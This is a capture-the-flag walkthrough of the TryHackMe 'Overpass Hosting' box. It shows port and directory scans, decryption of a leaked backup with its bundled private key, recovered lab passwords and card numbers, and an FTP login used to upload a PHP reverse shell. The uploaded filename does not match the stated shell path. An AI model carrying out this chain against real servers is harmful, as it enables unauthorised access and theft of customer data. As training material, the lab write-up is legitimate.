---
sidebar_position: 1
title: Overpass HOSTING
sidebar_label: Enumeration
description: You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security...
keywords: [overpass hosting, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, ffuf, ftp, privilege escalation]
---


:::note Box Description

You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security...

:::


## NMAP

- <b style={{ color: 'DarkKhaki' }}>[FTP: 21]</b> <b style={{ color: 'Coral' }}>[SSH: 22]</b> <b style={{ color: 'LightSkyBlue' }}>[HTTP: 80]</b>

```log
Nmap scan report for 10.10.109.248
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Unix
```


## FFUF

- **Exposed Backup Folder:** <b style={{ color: 'SandyBrown' }}>[IP:80/backups]</b>

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.109.248/FUZZ
 :: Wordlist         : FUZZ: Dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

backups                 [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 118ms]
```

<br/>

---
## Content Discovery
- **Backup Folder:** <b style={{ color: 'SandyBrown' }}>[IP:80/backups]</b>

```log
   [ICO]          Name        Last modified   Size Description
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[PARENTDIR] Parent Directory                     -  
[ ]         backup.zip       2020-11-08 21:24  13K  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

<br/>

## Backup

Inside the **Backup.zip File** we have `priv.key` - `CustomerDetails.xlsx.gpg`



- We Import the `priv.key` && Decrypt  `CustomerDetails.xlsx.gpg`

```log
gpg --import priv.key        
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

gpg --decrypt CustomerDetails.xlsx.gpg 
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
```

After Decrypting [`CustomerDetails.xlsx.gpg`] we have a **Datasheet** of `Customer Name - Username - Passwords - Credit Card Number - CVC`. The only Useful Password is from the **User:** <b style={{ color: 'Chartreuse' }}>paradox</b>


```log
┌─────────────────┬────────────────┬───────────────────┬─────────────────────┬─────┐
| Customer Name   | Username       | Password          | Credit Card Number  | CVC |
|─────────────────|────────────────|───────────────────|─────────────────────|─────|
// highlight-next-line
| Par. A. Doxx    | paradox        | ShibesAreGreat123 | 4111 1111 4555 1142 | 432 |
| 0day Montgomery | 0day           | OllieIsTheBestDog | 5555 3412 4444 1115 | 642 |
| Muir Land       | muirlandoracle | A11D0gsAreAw3s0me | 5103 2219 1119 9245 | 737 |
└──────────────────────────────────────────────────────────────────────────────────┘
```


## FTP


- **We can Login as:** <b style={{ color: 'Chartreuse' }}>paradox</b><b style={{ color: 'Dark' }}>:</b><b style={{ color: 'Coral' }}>ShibesAreGreat123</b>
- We have the Permissions to **Upload** Files inside the `FTP` Server.
- **Uploading Reverse Shell:** `php-reverse-shell.phtml`

```log
ftp> ls -al
drwxrwxrwx    3 48       48             94 Nov 17  2020 .
drwxrwxrwx    3 48       48             94 Nov 17  2020 ..
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
ftp> put php-web-shell.phtml
```

- The **Reverse Shell** is going to be Located at: <b style={{ color: 'SandyBrown' }}>[IP:80/php-reverse-shell.phtml]</b>
